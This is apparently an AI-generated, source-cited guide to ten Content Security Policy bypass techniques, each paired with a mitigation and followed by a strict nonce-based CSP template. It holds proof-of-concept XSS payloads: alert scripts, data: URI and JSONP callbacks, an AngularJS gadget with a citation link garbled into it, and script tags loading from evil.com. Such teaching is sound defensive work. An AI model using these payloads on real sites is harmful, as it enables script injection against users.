
Common CSP bypass techniques exploit misconfigurations in the policy — research shows that approximately 94.7% of deployed CSPs that attempt to restrict script execution are ineffective due to configuration weaknesses. Here are the 10 most common bypass techniques and how to mitigate each effectively. [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)

***

## CSP Bypass Techniques and Mitigations

| Bypass Technique | CSP Misconfiguration | Example Payload | Effective Mitigation |
|---|---|---|---|
| `unsafe-inline` | `script-src` includes `'unsafe-inline'` | `<script>alert(1)</script>` | Remove `'unsafe-inline'`; use nonces or hashes  [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention) |
| `unsafe-eval` | `script-src` includes `'unsafe-eval'` | `eval('alert(1)')` | Remove `'unsafe-eval'`; replace with `JSON.parse()`  [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/) |
| Wildcard `script-src` | `script-src` contains `*` | `<script src='https://evil.com/payload.js'>` | Remove wildcards; use explicit origins or nonces  [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/) |
| Missing `object-src` | No `object-src` or `default-src` | `<object data='data:text/html;base64,...'>` | Set `object-src 'none'`  [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/) |
| JSONP endpoints | Whitelisted domain hosts JSONP API | `<script src='trusted.com/api?callback=alert(1)//'>` | Avoid whitelisting JSONP domains; use nonces + `strict-dynamic`  [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/) |
| File upload bypass | `script-src 'self'` + file upload feature | Upload evil.js, then `<script src='/uploads/evil.js'>` | Validate file types; serve uploads from different origin  [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/) |
| CDN script gadgets | CDN hosts JS frameworks (AngularJS, Vue) | Load AngularJS from CDN, use `ng-focus` for RCE | Use nonces + `strict-dynamic`; avoid domain whitelists  [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention) |
| Missing `base-uri` | No `base-uri` directive | `<base href='https://evil.com/'>` hijacks relative URLs | Set `base-uri 'self'` or `'none'`  [aszx87410.github](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/) |
| `data:` URI scripts | `script-src` allows `data:` scheme | `<script src='data:;base64,YWxlcnQoMSk='>` | Remove `data:` from `script-src`  [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/) |
| Script gadgets (nonce bypass) | Framework code evaluates strings even with nonces | AngularJS template injection via whitelisted script | Use `strict-dynamic`; remove frameworks with eval patterns  [swag.cispa](https://swag.cispa.saarland/papers/roth2020gadgets.pdf) |

***

## Detailed Breakdown of Each Bypass

### 1. unsafe-inline — The Most Common Bypass

Including `'unsafe-inline'` in `script-src` allows inline `<script>` blocks, inline event handlers (`onclick`, `onerror`), and `javascript:` URIs to execute freely. If an attacker has any HTML injection point, they achieve full XSS with a simple `<script>alert(1)</script>` payload. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

```http
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline';
```

**Mitigation:** Replace `'unsafe-inline'` with per-request nonces or integrity hashes: [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)
```http
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m123';
```
Each legitimate script tag includes the nonce:
```html
<script nonce="r4nd0m123">/* legitimate code */</script>
```
Injected scripts without the nonce are blocked. [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)

***

### 2. unsafe-eval — Dynamic Code Evaluation

When `'unsafe-eval'` is present, attackers can use `eval()`, `new Function()`, and `setTimeout('code')` to execute arbitrary JavaScript. This is particularly dangerous in applications that concatenate user input into eval'd strings. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

```http
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval';
```

**Mitigation:** Remove `'unsafe-eval'`. Replace `eval(JSON_string)` with `JSON.parse(JSON_string)`. Refactor `new Function()` constructors to use static function definitions. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

***

### 3. Wildcard script-src

A wildcard (`*`) in `script-src` allows scripts to be loaded from any origin, completely negating CSP's script execution protections. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

```http
Content-Security-Policy: default-src 'none'; script-src *;
```

**Mitigation:** Remove all wildcards. Use explicit origins or, better, nonces with `strict-dynamic`: [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)
```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

***

### 4. Missing object-src

Without `object-src` or `default-src`, `<object>`, `<embed>`, and `<applet>` elements are unrestricted. Attackers inject `<object>` tags that load `data:` URIs containing base64-encoded JavaScript. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**Mitigation:** Set `object-src 'none'` to disable all plugin embedding: [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)
```http
Content-Security-Policy: object-src 'none';
```

***

### 5. JSONP Endpoint Abuse

If a whitelisted domain hosts a JSONP endpoint, an attacker can use it as a script source with a malicious callback. The JSONP response is valid JavaScript that executes the attacker's callback function. [rootshell.yanivhaliwa](https://rootshell.yanivhaliwa.com/study/advanced-csp-bypass-techniques)

```http
Content-Security-Policy: script-src 'self' https://accounts.google.com;
```

**Payload:**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
```

The response contains `alert(1)//({...})`, which is valid JavaScript that executes `alert(1)`. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

**Mitigation:** Avoid whitelisting domains with JSONP endpoints. Use nonces with `strict-dynamic` instead of domain allow-lists: [rootshell.yanivhaliwa](https://rootshell.yanivhaliwa.com/study/advanced-csp-bypass-techniques)
```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

***

### 6. File Upload Bypass

With `script-src 'self'`, if the application has a file upload feature, an attacker uploads a JavaScript file and references it as a script source. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

```html
<script src="/uploads/avatar_123.js"></script>
```

**Mitigation:** Validate uploaded file types strictly. Serve uploaded files from a different origin (e.g., `uploads.example-cdn.com`) that is not in `script-src`. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

***

### 7. CDN Script Gadgets

CDNs like `cdnjs.cloudflare.com` and `cdn.jsdelivr.net` host JavaScript frameworks that can be used as "script gadgets" — existing code that can be coerced into executing attacker-controlled logic. AngularJS is the most notorious example. [portswigger](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro)

Google's research identified script gadgets in Angular, Vue.js, Aurelia, Polymer, Knockout, jQuery Mobile, and others that bypass CSP whitelists, nonces, `unsafe-eval`, and even `strict-dynamic` in some cases. [github](https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md)

**AngularJS bypass example:**
```html
<!-- Load AngularJS from whitelisted CDN -->
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<!-- Use ng-focus + orderBy to execute arbitrary JS -->
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from( [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention),alert)'">
</div>
```

The `ng-focus` directive is a non-standard event handler that AngularJS processes internally, bypassing CSP's inline script restrictions. The `orderBy` filter traverses the array to reach the `window` object, and `Array.from()` calls `alert` indirectly. [portswigger](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro)

**Mitigation:** Avoid domain-based allow-lists entirely. Use nonces with `strict-dynamic`, which allows only scripts loaded by already-trusted (nonced) scripts to execute: [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)
```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

***

### 8. Missing base-uri

Without a `base-uri` directive, an attacker who can inject HTML can add a `<base>` tag that changes the base URL for all relative URLs on the page. [aszx87410.github](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

```html
<base href="https://evil.com/">
<!-- Now <script src="/js/app.js"> loads from https://evil.com/js/app.js -->
```

**Mitigation:** Set `base-uri 'self'` or `base-uri 'none'`. Note that `base-uri` does **not** inherit from `default-src`, so it must be set explicitly: [aszx87410.github](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
```http
Content-Security-Policy: base-uri 'self';
```

***

### 9. data: URI Scripts

If `data:` is allowed in `script-src`, attackers can embed JavaScript directly in a `data:` URI, bypassing external script restrictions. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

```http
Content-Security-Policy: script-src 'self' data:;
```

```html
<script src="data:;base64,YWxlcnQoMSk="></script>
```

**Mitigation:** Never allow `data:` in `script-src`. Only allow `data:` for `img-src` or `font-src` if needed: [rootshell.yanivhaliwa](https://rootshell.yanivhaliwa.com/study/advanced-csp-bypass-techniques)
```http
Content-Security-Policy: script-src 'self'; img-src 'self' data:;
```

***

### 10. Open Redirect + Trusted Domain Combination

If a whitelisted domain has an open redirect, an attacker can chain it to load scripts from an arbitrary origin. The browser sees the request going to the trusted domain, but the redirect sends it to the attacker's server. [bitsfolio](https://bitsfolio.com/csp-bypasses-content-security-policy-useless/)

```http
Content-Security-Policy: script-src 'self' https://trusted.com;
```

**Payload:**
```html
<script src="https://trusted.com/redirect?url=https://evil.com/payload.js"></script>
```

**Mitigation:** Use nonces with `strict-dynamic` instead of domain allow-lists. If domain allow-listing is necessary, audit whitelisted domains for open redirect vulnerabilities. [rootshell.yanivhaliwa](https://rootshell.yanivhaliwa.com/study/advanced-csp-bypass-techniques)

***

## Strict CSP Template

The most robust defense against all bypasses above is a nonce-based CSP with `strict-dynamic`: [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)

```http
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-src 'none';
  frame-ancestors 'none';
  connect-src 'self';
  img-src 'self' data:;
  style-src 'self';
  font-src 'self';
  form-action 'self';
  require-trusted-types-for 'script';
  upgrade-insecure-requests;
  report-uri /csp-reports;
```

Key features of this template:
- `default-src 'none'` — blocks everything not explicitly allowed
- `'nonce-{RANDOM}'` — only scripts with the per-request nonce execute
- `'strict-dynamic'` — trust propagates from nonced scripts to their dynamically loaded children
- `object-src 'none'` — blocks all plugin content
- `base-uri 'none'` — blocks `<base>` tag injection
- `require-trusted-types-for 'script'` — enforces Trusted Types, preventing DOM-based XSS via `innerHTML`, `outerHTML`, and similar sinks [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)

**Testing approach:** Deploy in `Content-Security-Policy-Report-Only` mode first, collect violation reports, and iteratively tighten the policy before enforcing: [safeguard](https://safeguard.sh/resources/blog/csp-bypass-techniques-prevention)
```http
Content-Security-Policy-Report-Only: default-src 'none'; script-src 'nonce-{RANDOM}'; report-uri /csp-reports;
```

Use Google's [CSP Evaluator](https://csp-evaluator.withgoogle.com/) to analyze your policy for known bypass patterns before enforcement. [vaadata](https://www.vaadata.com/en/blog/content-security-policy-bypass-techniques-and-security-best-practices/)
